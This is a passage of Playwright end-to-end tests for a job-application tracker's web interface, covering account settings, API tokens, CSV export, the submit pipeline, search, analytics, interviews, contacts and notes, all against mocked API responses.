test("the Account tab lists signed-in browsers and signs out everywhere else", async ({ page }) => {
  let revoked = false;
  page.on("request", (r) => {
    if (r.method() === "DELETE" && new URL(r.url()).pathname === "/api/account/sessions") revoked = true;
  });
  await openSettings(page);
  await page.getByRole("tab", { name: "Account" }).click();

  const list = page.getByRole("list", { name: "Where you're signed in" });
  await expect(list).toContainText("Firefox on Linux");
  await expect(list).toContainText("(this browser)");
  await expect(list).toContainText("Safari on iPhone");
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "Sign out everywhere else" }).click();
  await expect(page.locator("#toast")).toHaveText("Signed out 1 other session.");
  expect(revoked).toBe(true);
});

test("the Account tab makes an API token shown once and revokes one (#356)", async ({ page }) => {
  let made = null;
  let revoked = null;
  await page.route("**/api/account/tokens**", async (route) => {
    const r = route.request();
    const path = new URL(r.url()).pathname;
    if (r.method() === "POST") {
      made = r.postDataJSON();
      await route.fulfill({ status: 201, contentType: "application/json", body: JSON.stringify({
        id: 8, name: made.name, scope: made.scope, created_at: "2026-09-26T12:00:00Z", last_used_at: null, token: "atk_secret123" }) });
      return;
    }
    if (r.method() === "DELETE") { revoked = path; await route.fulfill({ status: 204 }); return; }
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify([
      { id: 7, name: "Laptop CLI", scope: "read", created_at: "2026-09-20T12:00:00Z", last_used_at: null },
    ]) });
  });
  await openSettings(page);
  await page.getByRole("tab", { name: "Account" }).click();

  const list = page.getByRole("list", { name: "API tokens" });
  await expect(list).toContainText("Laptop CLI");
  await expect(list).toContainText("never used");
  await expectNoSeriousViolations(page);

  await page.getByLabel("Name", { exact: true }).fill("Clipper");
  await page.getByLabel("Access").selectOption("write");
  await page.getByRole("button", { name: "Make a token" }).click();
  const secret = page.getByLabel(/Your new token/);
  await expect(secret).toBeFocused();
  await expect(secret).toHaveValue("atk_secret123");
  expect(made).toEqual({ name: "Clipper", scope: "write" });
  await expect(page.getByRole("status").filter({ hasText: "Made the token" })).toBeVisible();
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "Revoke the token Laptop CLI" }).click();
  await page.getByRole("button", { name: "Revoke", exact: true }).click();
  await expect.poll(() => revoked).toBe("/api/account/tokens/7");
  await expect(secret).toBeHidden();
  await expect(page.getByText("Token revoked.")).toBeVisible();
});

test("the Account tab downloads the applications as CSV (#357)", async ({ page }) => {
  await page.route("**/api/account/export.csv", (route) => route.fulfill({
    status: 200,
    headers: { "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": 'attachment; filename="applytrack-applications-2026-09-26.csv"' },
    body: "name,company\r\nacme.md,'=1+1\r\n",
  }));
  await openSettings(page);
  await page.getByRole("tab", { name: "Account" }).click();
  await expect(page.getByText(/No passwords, keys or tokens leave/)).toBeVisible();
  await expectNoSeriousViolations(page);

  const download = page.waitForEvent("download");
  await page.getByRole("button", { name: "Applications as a spreadsheet (CSV)" }).click();
  expect((await download).suggestedFilename()).toBe("applytrack-applications-2026-09-26.csv");
  await expect(page.locator("#toast")).toHaveText("Exported your applications as CSV.");
});

test("DELETE MY DATA needs the phrase typed before it will fire", async ({ page }) => {
  let deleted = false;
  await page.route("**/api/account", async (route) => {
    if (route.request().method() === "DELETE") deleted = true;
    await route.fulfill({ status: 204, body: "" });
  });

  await openSettings(page);
  await page.getByRole("tab", { name: "Account" }).click();
  await page.getByRole("button", { name: "DELETE MY DATA" }).click();

  const confirm = page.getByRole("button", { name: "DELETE MY DATA" }).last();
  await expect(confirm).toBeDisabled();
  await expectNoSeriousViolations(page);

  const field = page.getByLabel(/Type .* to confirm/);
  await field.fill("nope");
  await expect(confirm).toBeDisabled();
  await field.fill("I agree");
  await expect(confirm).toBeEnabled();
  expect(deleted).toBe(false);
});

test("the Ready lane offers bulk actions on the selection and submits them in one request", async ({ page }) => {
  const readyApps = [
    { ...application, status: "ready" },
    { ...applications[1], status: "ready" },
    applications[2],
  ];
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    const method = route.request().method();
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps" && method === "GET") body = readyApps;
    else if (path === "/api/stats") body = { status: { ready: 2, applied: 1 }, lane: {} };
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true, dry_run: true };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path === "/api/ready/actions") body = { action: "submit", dry_run: true, done: [application.filename], skipped: [] };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");
  // Nothing bulk-shaped until the list is filtered to Ready.
  await expect(page.getByRole("group", { name: "Ready lane bulk actions" })).toBeHidden();
  await page.locator("#filter-status").selectOption("ready");
  const bar = page.getByRole("group", { name: "Ready lane bulk actions" });
  await expect(bar).toBeVisible();
  await expect(bar.getByRole("button", { name: "Submit selected" })).toBeDisabled();
  await page.getByRole("checkbox", { name: "Select Example Co · Senior Engineer" }).check();
  await expect(bar).toContainText("1 selected");
  await expect(bar.getByRole("button", { name: "Submit selected" })).toBeEnabled();
  await expectNoSeriousViolations(page);

  const sent = page.waitForRequest((request) =>
    new URL(request.url()).pathname === "/api/ready/actions" && request.method() === "POST");
  await bar.getByRole("button", { name: "Submit selected" }).click();
  await page.locator("#confirm-accept").click();
  const req = await sent;
  expect(req.postDataJSON()).toEqual({ action: "submit", names: [application.filename] });
  await expect(page.locator("#toast")).toContainText("1 queued for a dry run");
});

test("the Pipeline button opens the submit queue and says what each request will do", async ({ page }) => {
  const button = page.getByRole("button", { name: "Pipeline" });
  await expect(button).toHaveAttribute("aria-pressed", "false");
  await button.click();
  await expect(page.getByRole("heading", { name: "Pipeline", level: 1 })).toBeVisible();
  await expect(button).toHaveAttribute("aria-pressed", "true");
  await expect(page.locator("#pipeline-summary")).toContainText("2 queued — 1 will submit, 1 dry run, 1 waiting for a code.");
  // The section heading carries its own item count (#264). exact: true pins the whole
  // accessible name — Playwright's name match is a substring by default, so the bare
  // form would also pass against a wrong "Submit queue: (23)".
  await expect(page.getByRole("heading", { name: "Submit queue: (2)", level: 2, exact: true })).toBeVisible();
  const table = page.getByRole("table", { name: "Queued submit requests, oldest first" });
  await expect(table.getByRole("row")).toHaveCount(3);
  await expect(table).toContainText("Waiting for the code the board emailed you");
  await expect(table).toContainText("Will submit");
  await expect(table).toContainText("Dry run only is on in Settings · Agent");
  await expect(page.getByText("Dry run only is ON — nothing submits for real")).toBeVisible();
  await expectNoSeriousViolations(page);

  // A queued row opens its application; leaving the view un-presses the strip button.
  await table.getByRole("button", { name: "Example Co · Senior Engineer" }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeVisible();
  await expect(page.getByRole("button", { name: "Pipeline" })).toHaveAttribute("aria-pressed", "false");
});

test("an empty Pipeline still counts its section, at zero (#264)", async ({ page }) => {
  // The zero is a stated design decision, not an accident: an empty section reads "(0)"
  // rather than dropping the count, so the heading keeps one shape in every state and
  // "empty" stays distinguishable from "the render broke". Registered after mockApi, so
  // this override wins for /api/pipeline.
  await page.route("**/api/pipeline", (route) =>
    route.fulfill({
      status: 200, contentType: "application/json",
      body: JSON.stringify({
        ...pipeline,
        queue: [], ready: [],
        summary: { ...pipeline.summary, queued: 0, promotable: 0 },
      }),
    }));

  await page.getByRole("button", { name: "Pipeline" }).click();
  await expect(page.getByRole("heading", { name: "Submit queue: (0)", level: 2, exact: true })).toBeVisible();
  // The count agrees with the empty-state copy beneath it, not merely with itself.
  await expect(page.getByText("Nothing is queued.")).toBeVisible();
  await expectNoSeriousViolations(page);
});

test("a status chip opens that status's applications as a list in the main pane", async ({ page }) => {
  const chip = page.getByRole("button", { name: "lead, 2 applications" });
  await chip.click();
  await expect(chip).toHaveAttribute("aria-pressed", "true");
  await expect(page.getByRole("heading", { name: "Lead", level: 1 })).toBeVisible();
  const table = page.getByRole("table", { name: "Lead applications" });
  await expect(table.getByRole("row")).toHaveCount(3);
  await expect(table).not.toContainText("Aurora Systems");
  await expectNoSeriousViolations(page);

  // Another chip swaps the list; un-pressing the chip closes it.
  await page.getByRole("button", { name: "applied, 1 applications" }).click();
  await expect(page.getByRole("heading", { name: "Applied", level: 1 })).toBeVisible();
  await expect(page.getByRole("table", { name: "Applied applications" })).toContainText("Aurora Systems");
  const applied = page.getByRole("button", { name: "applied, 1 applications" });
  await applied.click();
  await expect(applied).toHaveAttribute("aria-pressed", "false");
  await expect(page.getByRole("heading", { name: "Applied", level: 1 })).toHaveCount(0);

  // A row opens its application.
  await page.getByRole("button", { name: "lead, 2 applications" }).click();
  await page.getByRole("table", { name: "Lead applications" }).getByRole("button", { name: "Example Co · Senior Engineer" }).click();
  await expect(page.getByRole("heading", { name: "Example Co" })).toBeVisible();
});

test("the errors chip sits between ready and applied and lists what is stuck, and why", async ({ page }, testInfo) => {
  // A failed run used to drop its application back into Ready, where it looked like a
  // packet nobody had tried (#284).
  const readyApps = [
    { ...application, status: "ready" },
    { ...applications[1], status: "ready" },
    applications[2],
  ];
  const stuck = {
    name: application.filename, company: application.company, role: application.role,
    link: "https://careers.example.com/jobs/1", provider: "unknown",
    error: "no application form was found on the page — nothing to fill (the Apply button did not respond within 5 s)",
    at: "2026-09-20T07:05:03Z", runs: 4, captcha: false,
    next: "you", retry_at: null, why: "gave up after 3 failed runs in 7 days",
  };
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    const method = route.request().method();
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps" && method === "GET") body = readyApps;
    else if (path === "/api/stats") body = { status: { ready: 2, applied: 1 }, lane: {}, errors: 1 };
    else if (path === "/api/errors") body = { count: 1, retrying: 0, needs_you: 1, errors: [stuck] };
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true, dry_run: false };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path.endsWith("/submit") && method === "POST") body = { queued: true, dry_run: true };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");

  // The errored one is an error, not a Ready packet: the two chips never count it twice.
  const strip = page.locator(".pipe-stat");
  await expect(strip).toHaveText([/1\s*ready/, /1\s*error$/, /1\s*applied/]);

  await page.getByRole("button", { name: "1 application with errors" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Errors" })).toBeVisible();
  const row = page.getByRole("row").filter({ hasText: application.company });
  await expect(row).toContainText("the Apply button did not respond within 5 s");
  await expect(row).toContainText("Needs you");
  await expect(row).toContainText("gave up after 3 failed runs in 7 days");
  await expectNoSeriousViolations(page);

  const sent = page.waitForRequest((request) =>
    new URL(request.url()).pathname.endsWith("/submit") && request.method() === "POST");
  await row.getByRole("button", { name: /^Retry / }).click();
  expect((await sent).postDataJSON()).toEqual({ dry_run: true });

  // Ready lists only what is still to try.
  await page.getByRole("button", { name: "ready, 1 applications" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Ready" })).toBeVisible();
  await expect(page.locator("#content")).toContainText("1 application.");
  await expect(page.locator("#content")).not.toContainText(application.company);

  // But a search finds it from anywhere, and says it is stuck (#322): "which page is DTCC on?"
  // (On a phone the list is its own pane, reached by the Applications button.)
  if (testInfo.project.name === "mobile") await page.getByRole("button", { name: "Applications", exact: true }).click();
  await page.getByLabel("Search applications").fill(application.company.split(" ")[0]);
  const card = page.locator("#application-list .application-card").filter({ hasText: application.company });
  await expect(card).toBeVisible();
  await expect(card).toContainText("In Errors");
  await expect(page.locator("#app-count")).toHaveText(/^1 match in all 3 applications$/);
  // A search is not a Ready selection: no bulk checkboxes over a list of every status.
  await expect(page.locator("#bulk-bar")).toBeHidden();
  await expectNoSeriousViolations(page);
});

test("a search lists every match with its number, where it is, and its posting, filtered and paged", async ({ page }, testInfo) => {
  // "Which page is DTCC on?" (#326): the answer is a number to search for and a table that
  // says where each match is — Errors included — with links to it and to the posting.
  const many = Array.from({ length: 23 }, (_, i) => ({
    ...applications[1], id: 100 + i, filename: `acme-${i}.md`, company: `Acme ${i}`, role: "Engineer",
    status: i % 2 ? "lead" : "ready", link: `https://jobs.example.com/${i}`,
  }));
  const dtcc = { ...application, id: 15339, filename: "dtcc-senior.md", company: "The Depository Trust & Clearing Corporation (DTCC)",
    role: "Senior Software Engineer", status: "ready", link: "https://ebxr.fa.us2.oraclecloud.com/job/212747" };
  const stuck = { name: dtcc.filename, company: dtcc.company, role: dtcc.role, link: dtcc.link, provider: "unknown",
    error: "the sign-in code was taken but no application form followed", at: "2026-09-24T07:26:06Z", runs: 3,
    captcha: false, next: "you", retry_at: null, why: "the same thing will happen on another run — it needs you, or a fix" };
  await page.unroute("**/api/**");
  await page.route("**/api/**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    let body = { ok: true };
    if (path === "/api/auth/me") body = { email: "person@example.com" };
    else if (path === "/api/apps") body = [dtcc, ...many];
    else if (path === "/api/stats") body = { status: { ready: 12, lead: 11 }, lane: {}, errors: 1 };
    else if (path === "/api/errors") body = { count: 1, retrying: 0, needs_you: 1, errors: [stuck] };
    else if (path === "/api/agent-settings") body = { enabled: true, worker_running: true, browser_available: true, dry_run: false };
    else if (path === "/api/llm-settings") body = { cover_letters_enabled: true };
    else if (path === `/api/apps/${dtcc.filename}`) body = { ...detail, filename: dtcc.filename, fields: { ...detail.fields, company: dtcc.company, status: "ready" } };
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await page.goto("/");

  // By its number: the one result, where it is, and both links.
  const box = page.getByLabel("Search applications");
  await box.fill("#15339");
  await box.press("Enter");
  await expect(page.getByRole("heading", { level: 1, name: "Results for “#15339”" })).toBeVisible();
  const row = page.getByRole("row").filter({ hasText: "DTCC" });
  await expect(row).toContainText("#15339");
  await expect(row.getByRole("button", { name: "Errors" })).toBeVisible();
  await expect(row.getByRole("link", { name: /Posting ↗/ })).toHaveAttribute("href", dtcc.link);
  await expect(row.getByRole("link", { name: /^The Depository/ })).toHaveAttribute("href", "#app=dtcc-senior.md");
  await expectNoSeriousViolations(page);

  // Twenty to a page, and the filters narrow it. (On a phone the results replace the list;
  // the Applications button brings the search box back.)
  const backToList = async () => {
    if (testInfo.project.name === "mobile") await page.getByRole("button", { name: "Applications", exact: true }).click();
  };
  await backToList();
  await box.fill("acme");
  await box.press("Enter");
  await expect(page.locator("#content")).toContainText("1–20 of 23 matches");
  await page.getByRole("button", { name: "Next" }).click();
  await expect(page.locator("#content")).toContainText("21–23 of 23 matches");
  await page.getByLabel("Where").selectOption("lead");
  await expect(page.locator("#content")).toContainText("1–11 of 11 matches (23 before filtering)");

  // "Where it is" goes there.
  await backToList();
  await box.fill("15339");
  await box.press("Enter");
  await page.getByRole("row").filter({ hasText: "DTCC" }).getByRole("button", { name: "Errors" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Errors" })).toBeVisible();
  await expect(page.getByRole("row").filter({ hasText: "DTCC" })).toContainText("#15339");
});

test("a signed-in source's board account shows its session and offers Sign in now", async ({ page }) => {
  // The agent renews a kept session on its own six-hour clock, and LinkedIn's app tap has to
  // come within minutes of it; Sign in now lets the person pick the moment. An account that
  // keeps no session (SuccessFactors) gets no such button.
  const accounts = [
    { host: "career4.successfactors.com", username: "person@example.com", has_password: true, updated_at: "2026-09-14T06:18:51Z",
      keeps_session: false, session_expires_at: null, renew_requested_at: null },
    { host: "linkedin.com", username: "person@example.com", has_password: true, updated_at: "2026-09-21T22:16:21Z",
      keeps_session: true, session_expires_at: null, renew_requested_at: null },
  ];
  let renewed = 0;
  await page.route("**/api/board-accounts**", async (route) => {
    const path = new URL(route.request().url()).pathname;
    let body = accounts;
    if (route.request().method() === "POST" && path === "/api/board-accounts/linkedin.com/renew") {
      renewed += 1;
      accounts[1].renew_requested_at = "2026-09-22T17:30:00Z";
    }
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  });
  await openSettings(page);
  await page.getByRole("tab", { name: "Agent", exact: true }).click();
  const list = page.locator("#board-accounts");
  await expect(list).toContainText("no session kept");
  await expect(list.getByRole("button", { name: "Sign in to linkedin.com now" })).toBeVisible();
  await expect(list.getByRole("button", { name: /Sign in to career4/ })).toHaveCount(0);
  await expectNoSeriousViolations(page);

  await list.getByRole("button", { name: "Sign in to linkedin.com now" }).click();
  await expect(list).toContainText("sign-in requested, the agent is on it");
  await expect(list.getByRole("button", { name: "Sign in to linkedin.com now" })).toBeDisabled();
  expect(renewed).toBe(1);
});

test("the Analytics button opens the funnel, response rate and breakdowns as tables (#353)", async ({ page }) => {
  const button = page.getByRole("button", { name: "Analytics" });
  await expect(button).toHaveAttribute("aria-pressed", "false");
  const first = page.waitForRequest((r) => new URL(r.url()).pathname === "/api/analytics");
  await button.click();
  expect(new URL((await first).url()).search).toBe("");
  await expect(page.getByRole("heading", { name: "Analytics", level: 1 })).toBeVisible();
  await expect(button).toHaveAttribute("aria-pressed", "true");
  await expect(page.locator("#analytics-summary")).toHaveText("4 applied — 75% heard back, after a median 6 days.");
  const funnel = page.getByRole("table", { name: "How many applications reached each stage" });
  await expect(funnel.getByRole("row")).toHaveCount(5);
  await expect(funnel.getByRole("row", { name: /Screen/ })).toContainText("50%");
  const sources = page.getByRole("table", { name: "Response rate by source" });
  await expect(sources).toContainText("LinkedIn");
  await expect(sources).toContainText("(no source)");
  await expect(page.getByRole("table", { name: "Response rate by lane" })).toContainText(".NET");
  await expectNoSeriousViolations(page);

  // The range asks for applications applied since that many days ago.
  const ranged = page.waitForRequest((r) => new URL(r.url()).pathname === "/api/analytics");
  await page.getByLabel("Applied in").selectOption("30");
  expect(new URL((await ranged).url()).searchParams.get("since")).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);

  // Another view takes the pane and un-presses the button.
  await page.getByRole("button", { name: "Pipeline" }).click();
  await expect(page.getByRole("heading", { name: "Pipeline", level: 1 })).toBeVisible();
  await expect(page.getByRole("button", { name: "Analytics" })).toHaveAttribute("aria-pressed", "false");
});

test("an empty Analytics range says so instead of drawing zeros (#353)", async ({ page }) => {
  await page.route("**/api/analytics*", (route) => route.fulfill({
    status: 200, contentType: "application/json",
    body: JSON.stringify({ ...analytics, applied: 0, responded: 0, rejected: 0, response_rate: null,
      median_days_to_response: null, by_source: [], by_lane: [], funnel: analytics.funnel.map((f) => ({ ...f, count: 0 })) }),
  }));
  await page.getByRole("button", { name: "Analytics" }).click();
  await expect(page.locator("#analytics-summary")).toHaveText("Nothing applied for in this range yet.");
  await expect(page.getByRole("table")).toHaveCount(0);
  await expectNoSeriousViolations(page);
});

test("an application's sheet lists its status history, oldest first (#353)", async ({ page }) => {
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "Status history", level: 3 })).toBeVisible();
  const items = page.locator("#history-list li");
  await expect(items).toHaveCount(2);
  await expect(items.nth(0)).toContainText("Added as Lead");
  await expect(items.nth(1)).toContainText("Lead");
  await expect(items.nth(1)).toContainText("Applied");
  await expect(items.nth(1).locator("time")).toHaveAttribute("datetime", "2026-09-03T12:00:00Z");
  await expectNoSeriousViolations(page);
});

// ---- Follow-ups, interviews and the calendar feed (#354) ----------------------------

test("the Due chip opens follow-ups due or overdue and the coming interviews (#354)", async ({ page }) => {
  const withFollowups = applications.map((a) => a === appliedApp ? { ...a, followup: "2026-03-08" } : a);
  await page.route("**/api/apps", (route) => route.fulfill({
    status: 200, contentType: "application/json", headers: { ETag: '"apps-due"' }, body: JSON.stringify(withFollowups),
  }));
  const soon = new Date(Date.now() + 2 * 86400000).toISOString();
  await page.route("**/api/due*", (route) => route.fulfill({
    status: 200, contentType: "application/json",
    body: JSON.stringify({ today: "2026-09-26", followups: [], interviews: [
      { id: 7, name: application.filename, company: application.company, role: application.role, at: soon, note: "Panel with the team" },
    ] }),
  }));
  await page.reload();
  await expect(page.getByRole("heading", { name: "Applications" })).toBeVisible();

  // The overdue follow-up is flagged on its card.
  await expect(page.locator("#app-list").getByRole("button", { name: /Aurora Systems/ })).toContainText("Overdue");

  await page.getByRole("button", { name: "2 due — follow-ups and interviews" }).click();
  await expect(page.getByRole("heading", { level: 1, name: "Due" })).toBeFocused();
  const interviews = page.getByRole("table", { name: "Interviews in the coming week" });
  await expect(interviews.getByRole("row").filter({ hasText: "Example Co" })).toContainText("Panel with the team");
  const followups = page.getByRole("table", { name: "Follow-ups due today or overdue" });
  const row = followups.getByRole("row").filter({ hasText: "Aurora Systems" });
  await expect(row).toContainText("2026-03-08");
  await expect(row).toContainText("Overdue");
  await expect(page.getByRole("button", { name: "2 due — follow-ups and interviews" })).toHaveAttribute("aria-pressed", "true");
  await expectNoSeriousViolations(page);

  await row.getByRole("button", { name: /Aurora Systems/ }).click();
  await expect(page.getByRole("heading", { name: "Aurora Systems", level: 2 })).toBeVisible();
});

test("an application's sheet schedules and removes interviews, and the timeline shows them (#354)", async ({ page }) => {
  let scheduled = [];
  let posted = null;
  let removed = null;
  await page.route(`**/api/apps/${application.filename}/interviews**`, async (route) => {
    const req = route.request();
    if (req.method() === "POST") {
      posted = req.postDataJSON();
      scheduled = [{ id: 11, at: posted.at, note: posted.note }];
      await route.fulfill({ status: 201, contentType: "application/json", body: JSON.stringify(scheduled[0]) });
    } else if (req.method() === "DELETE") {
      removed = new URL(req.url()).pathname;
      scheduled = [];
      await route.fulfill({ status: 204 });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(scheduled) });
    }
  });
  await page.route("**/history", (route) => route.fulfill({
    status: 200, contentType: "application/json", body: JSON.stringify([
      ...history,
      { kind: "interview", from_status: null, to_status: "", at: "2026-09-10T15:00:00Z", note: "Phone screen" },
      { kind: "followup", from_status: null, to_status: "", at: "2026-09-12T00:00:00Z", note: null },
    ]),
  }));
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "Interviews", level: 3 })).toBeVisible();
  await expect(page.locator("#interview-list")).toContainText("No interviews scheduled.");
  const timeline = page.locator("#history-list li");
  await expect(timeline).toHaveCount(4);
  await expect(timeline.nth(2)).toContainText("Interview — Phone screen");
  await expect(timeline.nth(3)).toContainText("Follow-up due");
  await expect(timeline.nth(3).locator("time")).toHaveAttribute("datetime", "2026-09-12");

  // No date: the field says so and nothing is sent.
  await page.getByRole("button", { name: "Add interview" }).click();
  await expect(page.getByLabel("Date and time")).toHaveAttribute("aria-invalid", "true");
  expect(posted).toBeNull();

  await page.getByLabel("Date and time").fill("2026-10-01T15:00");
  await page.getByLabel("Note (optional)").fill("Onsite with the platform team");
  await page.getByRole("button", { name: "Add interview" }).click();
  await expect.poll(() => posted).not.toBeNull();
  expect(new Date(posted.at).getTime()).toBe(new Date("2026-10-01T15:00").getTime());
  expect(posted.note).toBe("Onsite with the platform team");
  await expect(page.locator("#interview-list")).toContainText("Onsite with the platform team");
  await expectNoSeriousViolations(page);

  await page.locator("#interview-list").getByRole("button", { name: /Remove the interview on/ }).click();
  await expect.poll(() => removed).toBe(`/api/apps/${application.filename}/interviews/11`);
  await expect(page.locator("#interview-list")).toContainText("No interviews scheduled.");
});

test("notifications carry the reminder toggle and hour, and make a calendar link shown once (#354)", async ({ page }) => {
  let saved = null;
  let revoked = false;
  page.on("request", (r) => {
    if (r.method() === "PUT" && new URL(r.url()).pathname === "/api/notifications") saved = r.postDataJSON();
  });
  await page.route("**/api/calendar/feed", async (route) => {
    if (route.request().method() === "DELETE") { revoked = true; await route.fulfill({ status: 204 }); return; }
    await route.fulfill({ status: 200, contentType: "application/json",
      body: JSON.stringify({ enabled: true, path: "/api/calendar.ics?token=abc123", url: null, created_at: "2026-09-26T12:00:00Z" }) });
  });
  await openSettings(page);
  await page.getByRole("tab", { name: "Notifications", exact: true }).click();
  const reminder = page.getByRole("checkbox", { name: /Follow-ups due today and interviews/ });
  await expect(reminder).toBeChecked();
  await expect(page.getByRole("combobox", { name: "Send the daily reminder at" })).toHaveValue("12");
  await expect(page.getByText("No calendar link yet.")).toBeVisible();
  await expect(page.getByRole("button", { name: "Turn the link off" })).toBeDisabled();
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "Make a link" }).click();
  const link = page.getByLabel(/Your calendar link/);
  await expect(link).toBeFocused();
  await expect(link).toHaveValue(/\/api\/calendar\.ics\?token=abc123$/);
  await expect(page.getByRole("button", { name: "Copy link" })).toBeVisible();
  await expectNoSeriousViolations(page);

  await page.getByRole("button", { name: "Turn the link off" }).click();
  await page.getByRole("button", { name: "Turn it off" }).click();
  await expect.poll(() => revoked).toBe(true);
  await expect(link).toBeHidden();
  await expect(page.getByText("The calendar link is off.")).toBeVisible();

  await reminder.uncheck();
  await page.getByRole("combobox", { name: "Send the daily reminder at" }).selectOption("7");
  await page.getByRole("button", { name: "Save notifications" }).click();
  await expect.poll(() => saved).not.toBeNull();
  expect(saved.notify_followup_due).toBe(false);
  expect(saved.reminder_hour).toBe(7);
});

test("the list says when the poller last ran and which sources failed (#359)", async ({ page }) => {
  const status = page.locator("#poll-status");
  await expect(status).toContainText("Last polled 12 min ago");
  const failing = status.getByText("2 sources failing");
  await expect(failing).toBeVisible();
  await expect(status.getByText("remoteok")).toBeHidden();
  // A disclosure: reachable and opened from the keyboard, and the reasons are then read out.
  await failing.focus();
  await expect(failing).toBeFocused();
  await page.keyboard.press("Enter");
  await expect(status.getByText("remoteok")).toBeVisible();
  await expect(status).toContainText("HTTPStatusError: Client error '404 Not Found'");
  await expectNoSeriousViolations(page);
});

// ---- People and the notes log (#360) -------------------------------------------------

test("an application's sheet adds people with their part, edits one under its version, and removes them (#360)", async ({ page }) => {
  const rae = { id: 5, name: "Rae Recruiter", email: "rae@example.com", phone: "", role: "", company: "Example Co", linkedin: "https://www.linkedin.com/in/rae", notes: "", version: "1", applications: [] };
  const pat = { id: 6, name: "Pat Panel", email: "", phone: "", role: "", company: "", linkedin: "", notes: "", version: "1", applications: [] };
  let everyone = [pat];
  let linked = [];
  let posted = null;
  let put = null;
  let removed = null;
  await page.route("**/api/contacts", (route) => route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(everyone) }));
  await page.route("**/api/contacts/5?*", async (route) => {
    put = { url: route.request().url(), body: route.request().postDataJSON() };
    linked = [{ contact: { ...rae, ...put.body, version: "2" }, role: "Recruiter" }];
    await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(linked[0].contact) });
  });
  await page.route(`**/api/apps/${application.filename}/contacts**`, async (route) => {
    const req = route.request();
    if (req.method() === "POST") {
      posted = req.postDataJSON();
      linked = [{ contact: rae, role: posted.role }];
      everyone = [rae, pat];
      await route.fulfill({ status: 201, contentType: "application/json", body: JSON.stringify(linked[0]) });
    } else if (req.method() === "DELETE") {
      removed = new URL(req.url()).pathname;
      linked = [];
      await route.fulfill({ status: 204 });
    } else {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(linked) });
    }
  });
  await page.getByRole("button", { name: /Example Co/ }).click();
  await expect(page.getByRole("heading", { name: "People", level: 3 })).toBeVisible();
  await expect(page.locator("#people-list")).toContainText("No people added yet.");
  await expect(page.getByLabel("Person", { exact: true }).locator("option")).toHaveCount(2);

  // No name and nobody picked: the field says so and nothing is sent.
  await page.getByRole("button", { name: "Add person" }).click();
  await expect(page.getByLabel("Name", { exact: true })).toHaveAttribute("aria-invalid", "true");
  expect(posted).toBeNull();

  await page.getByLabel("Name", { exact: true }).fill("Rae Recruiter");
  await page.getByLabel("Email (optional)").fill("rae@example.com");
  await page.getByLabel("Part in this process (optional)").fill("Recruiter");
  await page.getByRole("button", { name: "Add person" }).click();
  await expect.poll(() => posted).not.toBeNull();
  expect(posted.contact).toEqual({ name: "Rae Recruiter", email: "rae@example.com", phone: "" });
  expect(posted.role).toBe("Recruiter");
  const person = page.locator("#people-list li.person");
  await expect(person).toContainText("Rae Recruiter");
  await expect(person.getByRole("link", { name: "rae@example.com" })).toHaveAttribute("href", "mailto:rae@example.com");
  await expect(person.getByRole("link", { name: /Rae Recruiter's profile/ })).toBeVisible();
  await expectNoSeriousViolations(page);

  // Picking someone already known hides the new-person fields.
  await page.getByLabel("Person", { exact: true }).selectOption("6");
  await expect(page.getByLabel("Name", { exact: true })).toBeHidden();

  await person.getByRole("button", { name: "Edit Rae Recruiter" }).click();
  const edit = page.getByRole("form", { name: "Edit Rae Recruiter" });
  await expect(edit.getByLabel("Name")).toBeFocused();
  await expectNoSeriousViolations(page);
  await edit.getByLabel("Phone").fill("+1 402 555 0100");
  await edit.getByRole("button", { name: "Save" }).click();
  await expect.poll(() => put).not.toBeNull();
  expect(put.url).toContain("expected_version=1");
  expect(put.body.phone).toBe("+1 402 555 0100");
  expect(put.body.linkedin).toBe("https://www.linkedin.com/in/rae");
  await expect(page.locator("#people-list")).toContainText("+1 402 555 0100");

  await page.getByRole("button", { name: "Take Rae Recruiter off this application" }).click();
  await expect.poll(() => removed).toBe(`/api/apps/${application.filename}/contacts/5`);
  await expect(page.locator("#people-list")).toContainText("No people added yet.");
});

test("an application's sheet keeps a notes log, newest first, and the timeline shows it (#360)", async ({ page }) => {
  let notes = [];
  let posted = null;
  let removed = null;
  await page.route(`**/api/apps/${application.filename}/notes**`, async (route) => {
    const req = route.request();
    if (req.method() === "POST") {
      posted = req.postDataJSON();
      notes = [...notes, { id: 22, at: "2026-09-20T15:00:00Z", body: posted.body }];
      await route.fulfill({ status: 201, contentType: "application/json", body: JSON.stringify(notes.at(-1)) });
    } else if (req.method() === "DELETE") {
      removed = new URL(req.url()).pathname;
      notes = notes.filter((n) => n.id !== 22);
      await route.fulfill({ status: 204 });
